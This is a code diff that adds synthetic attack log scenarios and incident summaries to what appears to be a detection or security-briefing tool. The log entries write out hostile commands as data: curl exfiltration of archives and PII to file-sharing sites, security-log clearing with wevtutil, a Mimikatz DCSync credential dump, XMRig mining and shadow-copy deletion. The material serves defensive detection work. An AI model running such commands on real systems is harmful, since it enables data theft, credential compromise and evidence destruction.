@@ -486,6 +486,44 @@ sample_logs = {
 2026-05-12T14:15:33Z source=CloudTrail event=DeleteVaultKey vault=prod-kms-key user=admin.cloud status=success
 2026-05-12T14:18:50Z host=DEVEL-SRV-02 process=vssadmin.exe command="vssadmin delete shadows /all /quiet" user=SYSTEM
 2026-05-12T14:20:02Z host=DEVEL-SRV-02 process=cipher.exe command="cipher /w:C:\" user=SYSTEM
+""",
+
+    "Supply Chain Pipeline Compromise": """
+2026-05-13T10:02:15Z source=GitHub event=push repo=corporate-app user=dev.clara branch=main commit=e3a9f02 source_ip=198.51.100.99 country=UA
+2026-05-13T10:04:12Z source=Jenkins event=build_start project=corporate-app build_number=1442 runner=jenkins-worker-01
+2026-05-13T10:05:30Z host=jenkins-worker-01 process=npm event=package_install dependency=colors-validator version=1.2.4 status=downloaded
+2026-05-13T10:05:44Z host=jenkins-worker-01 process=node event=postinstall_execution script="node ./scripts/compile.js"
+2026-05-13T10:06:02Z host=jenkins-worker-01 process=curl event=outbound_connection dest_ip=91.198.115.42 dest_port=80 user=jenkins-worker-01
+2026-05-13T10:08:12Z source=IAM event=api_key_created user=dev.clara name=prod-deployer-key actor=jenkins-worker-01
+2026-05-13T10:10:45Z source=CloudIdentity event=RoleAssignment role=KubernetesClusterAdmin target=prod-deployer-key status=success
+""",
+
+    "Insider Threat / IP Theft": """
+2026-05-13T23:14:02Z source=ActiveDirectory event=login user=analyst.jones status=success source_ip=192.168.1.15 hour=off-hours
+2026-05-13T23:18:22Z host=CORP-LT-102 process=powershell.exe command="Get-ChildItem -Path \\\\shares\\research\\* -Include *.pdf,*.docx -Recurse"
+2026-05-13T23:22:15Z host=CORP-LT-102 process=7z.exe command="7z.exe a -pSecretKey123! backup.7z \\\\shares\\research\\*"
+2026-05-13T23:26:40Z host=CORP-LT-102 process=curl.exe command="curl.exe -F file=@backup.7z https://filetransfer.io/upload"
+2026-05-13T23:30:12Z host=CORP-LT-102 process=wevtutil.exe command="wevtutil.exe cl Security" user=SYSTEM
+""",
+
+    "Kubernetes Cryptojacking (K8s Abuse)": """
+2026-05-14T11:02:15Z source=Kubernetes event=CreatePod pod_name=api-cache-manager namespace=prod-web image=miner-pool/xmrig:latest user=dev.clara
+2026-05-14T11:05:30Z host=k8s-node-4 process=xmrig command="./xmrig --donate-level 1 -o pool.supportxmr.com:5555 -u 44AFF..." parent=containerd user=root
+2026-05-14T11:06:02Z host=k8s-node-4 dest_ip=192.99.142.235 dest_port=5555 event=outbound_mining_pool protocol=TCP
+2026-05-14T11:08:12Z source=Kubernetes event=CreateRoleBinding role=cluster-admin target=kube-system-attacker namespace=kube-system
+""",
+
+    "Active Directory DCSync & Ticket Abuse": """
+2026-05-14T15:20:10Z source=ActiveDirectory event=TGS_Request service=MSSQLSvc/db-prod.corp:1433 user=user.alice ticket_encryption=RC4 status=success
+2026-05-14T15:22:45Z source=ActiveDirectory event=TGT_Request ticket_lifetime=99999 user=user.alice ticket_flags=0x40e00000 status=success
+2026-05-14T15:25:30Z host=DC-01 process=mimikatz.exe command="lsadump::dcsync /domain:corp.local /user:krbtgt" user=SYSTEM parent=cmd.exe
+2026-05-14T15:28:15Z host=DC-01 process=wevtutil.exe command="wevtutil.exe cl Security" user=SYSTEM
+""",
+
+    "API Token Abuse & Data Scraping": """
+2026-05-15T02:04:12Z source=APIGateway event=access_token_creation client_id=analytics-sync-service scope=read:all status=success source_ip=45.227.254.12
+2026-05-15T02:06:40Z source=APIGateway event=data_query query="SELECT * FROM customers_pii" records_returned=5280000 status=success source_ip=45.227.254.12
+2026-05-15T02:10:15Z host=api-gateway-01 process=curl.exe command="curl.exe -F file=@pii_dump.csv http://mega.nz/upload" user=gateway-service
 """
 }
 
@@ -608,6 +646,97 @@ pre_extracted_briefs = {
             "Host: DEVEL-SRV-02",
             "Process: vssadmin.exe",
             "Process: cipher.exe"
+        ]
+    },
+    "Supply Chain Pipeline Compromise": {
+        "summary": "An adversary compromised the credentials of 'dev.clara' to push commits containing a malicious dependency package (colors-validator) to the code repository. During the Jenkins CI/CD execution, a post-install compilation script executed a curl payload, harvested local environment secrets, created an IAM deployer API key, and assigned Kubernetes Cluster Admin rights to establish cloud persistence.",
+        "behaviors": [
+            "Unauthorized push to main branch from Ukrainian IP.",
+            "Malicious post-install compilation script execution during package install.",
+            "Outbound HTTP request from Jenkins build agent to command server.",
+            "Unauthorized creation of IAM deployment key inside CI runner.",
+            "High-privilege cloud role assignment (KubernetesClusterAdmin) to the deployment key."
+        ],
+        "iocs": [
+            "Account: dev.clara",
+            "IP: 198.51.100.99 (Ukraine)",
+            "Runner: jenkins-worker-01",
+            "Dependency: colors-validator",
+            "IP: 91.198.115.42",
+            "API Key: prod-deployer-key"
+        ]
+    },
+    "Insider Threat / IP Theft": {
+        "summary": "A corporate analyst logged in off-hours to recursively search and identify document assets on internal file shares. The user compressed the collected documents into a password-protected 7z archive and uploaded the data using curl to filetransfer.io, followed by clearing the security event log (wevtutil) to hide exfiltration indicators.",
+        "behaviors": [
+            "Unusual off-hours Active Directory authentication.",
+            "Recursive file search for PDF and DOCX files on file shares.",
+            "Password-protected compression of corporate files using 7z.",
+            "Outbound data exfiltration via curl to a public file sharing site.",
+            "Anti-forensic log clearing command (wevtutil cl Security) to remove activity trails."
+        ],
+        "iocs": [
+            "Account: analyst.jones",
+            "Host: CORP-LT-102",
+            "Process: powershell.exe",
+            "Process: 7z.exe",
+            "Process: curl.exe",
+            "Process: wevtutil.exe",
+            "File: backup.7z",
+            "Domain: filetransfer.io"
+        ]
+    },
+    "Kubernetes Cryptojacking (K8s Abuse)": {
+        "summary": "An adversary compromised developer credentials (dev.clara) to launch a rogue cryptomining pod ('api-cache-manager') inside the production Kubernetes cluster, executing the XMRig mining binary inside a container, initiating egress mining pool connections, and securing cluster persistence by establishing a cluster-admin RoleBinding.",
+        "behaviors": [
+            "Unauthorized pod deployment utilizing a public XMRig cryptomining container image.",
+            "Execution of cryptomining binary (XMRig) running as root inside a cluster pod.",
+            "Outbound network egress connection targeting a known public cryptomining pool IP.",
+            "Creation of cluster-admin RoleBinding to establish persistence within the Kubernetes cluster."
+        ],
+        "iocs": [
+            "Account: dev.clara",
+            "Pod: api-cache-manager (prod-web namespace)",
+            "Image: miner-pool/xmrig:latest",
+            "Process: xmrig",
+            "Destination IP: 192.99.142.235",
+            "Destination Port: 5555",
+            "RoleBinding: cluster-admin -> kube-system-attacker"
+        ]
+    },
+    "Active Directory DCSync & Ticket Abuse": {
+        "summary": "A multi-stage Active Directory attack was executed where the threat actor leveraged a compromised user account to request a TGS ticket with weak RC4 encryption (Kerberoasting) and request a TGT ticket with an anomalous 99,999-minute lifetime (Golden Ticket behavior). This was followed by running Mimikatz DCSync to replicate krbtgt credentials and executing anti-forensic event log clearing commands on the Domain Controller.",
+        "behaviors": [
+            "Kerberoasting behavior identified via TGS ticket request with weak RC4 encryption.",
+            "Golden Ticket persistence attempt identified by an anomalous TGT request lifetime of 99,999 minutes.",
+            "Credential dumping via DCSync replication requested from Domain Controller DC-01 using Mimikatz.",
+            "Anti-forensic log clearing using wevtutil.exe to wipe Security event logs."
+        ],
+        "iocs": [
+            "Account: user.alice",
+            "Service SPN: MSSQLSvc/db-prod.corp:1433",
+            "Ticket Lifetime: 99999 minutes",
+            "Host: DC-01",
+            "Process: mimikatz.exe",
+            "Command: lsadump::dcsync /domain:corp.local /user:krbtgt",
+            "Process: wevtutil.exe (wevtutil.exe cl Security)"
+        ]
+    },
+    "API Token Abuse & Data Scraping": {
+        "summary": "An adversary hijacked compromised system API client credentials from an anomalous IP address to generate a high-privilege access token, executed massive queries against customer databases to harvest over 5.28 million PII records, dumped the harvested data to a local CSV file, and exfiltrated the file to mega.nz using curl.",
+        "behaviors": [
+            "Token generation using a system client ID from a suspicious untrusted IP address.",
+            "Anomalous database query volume retrieving millions of customer PII records.",
+            "Outbound exfiltration of PII dump file via curl to mega.nz."
+        ],
+        "iocs": [
+            "Client ID: analytics-sync-service",
+            "IP: 45.227.254.12",
+            "Database Query: SELECT * FROM customers_pii",
+            "Volume: 5,280,000 records",
+            "Host: api-gateway-01",
+            "File: pii_dump.csv",
+            "Domain: mega.nz"
         ]
     }
 }
